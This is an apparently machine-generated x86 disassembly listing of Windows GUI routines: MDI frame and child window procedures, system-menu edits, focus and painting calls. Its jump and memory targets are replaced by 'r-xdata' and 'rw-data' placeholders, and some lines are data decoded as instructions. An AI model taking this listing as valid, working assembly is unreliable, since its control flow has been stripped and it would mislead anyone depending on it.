mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4562bd
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_453670
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov eax ebx
call sub_456c1c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43b5d0
push eax
mov eax ebx
call sub_43b614
push eax
mov eax ebx
call sub_4423cc
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_4068bc
mov [ ebx + 0x254 ] eax
push ebx
push sub_455208
call sub_41a480
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_44bf60
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4423cc
push eax
call SetWindowPos
jmp r-xdata
sub_45640a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_456535
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_43f554
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_458928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45653c
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_456544
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_43f7c0
push 0x0
mov eax ebx
call sub_4423cc
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_456588
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43ff44
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4423cc
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4423cc
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4565ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_456694
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45669b
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
mov eax edi
call sub_452980
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403420
mov eax ebx
call sub_4569a4
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403420
test al al
jne r-xdata
sub_4566a4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_43eea8
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_43eea8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_4565ec
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_4566ec
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_4565ec
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_456710
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_413a5c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413994
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_413a5c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413994
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_456980
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4423cc
mov dx 0xb000
call sub_452740
test al al
jne r-xdata
call sub_4423cc
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_452740
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456987
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a44
jmp r-xdata
call sub_403a44
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_43eea8
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4423cc
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_452740
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43cd98
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
call sub_403a44
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4423cc
mov dx 0xb01a
call sub_452740
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a44
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43cd98
sub_4569a4
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43cd98
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4423cc
push eax
call SetFocus
mov eax ebx
call sub_4423cc
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_4569f4
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43cd98
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_456aa8
mov eax esi
call sub_4569a4
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_4427f4
mov edx eax
mov eax esi
call sub_4565ec
sub_456a58
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_455670
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43cd98
mov eax ebx
call sub_455670
mov edx esi
call sub_456a58
sub_456aa8
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_44fa8c
mov edx esi
call sub_44fa70
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_456b50
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
sub_456b9c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_456b50
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_456bcc
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_456b50
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_456c38
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d0e4
xor eax eax
push ebp
push sub_456ce6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41d5b0
xor eax eax
push ebp
push sub_456cc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403420
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456cca
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41d5b0
retn
sub_456cf4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_455670
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_4556a4
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403420
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_441694
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_4556f0
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403420
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_456d94
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4423cc
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4423cc
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_456c1c
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4423cc
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44055c
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_456e12
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41ccc4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_456e74
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4423cc
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_440820
pop edi
pop esi
retn
sub_456ec0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4423cc
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_456fbc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_4559e4
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_456ec0
pop ecx
sub_456ff0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43d2b4
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4423cc
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4423cc
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4423cc
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43c28c
pop esi
pop ebx
retn
sub_457080
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_441620
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4423cc
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_44f4ac
sub_4570e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4406bc
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_44eec0
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45712c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_44f720
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_457164
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4571ff
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457206
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_44ee20
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45bf20
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_438d30
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45bf20
jmp r-xdata
sub_45722c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403420
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45726c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c820
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_457298
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_456a58
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_438b08
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_4572f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_441504
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45a8d4
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403420
sub_45737c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4423cc
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4423cc
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4423cc
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_457414
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4423cc
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_4569f4
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403420
sub_45746c
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_442900
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_457498
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_456a58
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4574b4
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_44ee50
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44ee50
sub_4574f4
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45752c
push ebp
mov ebp esp
push ebx
mov ebx eax
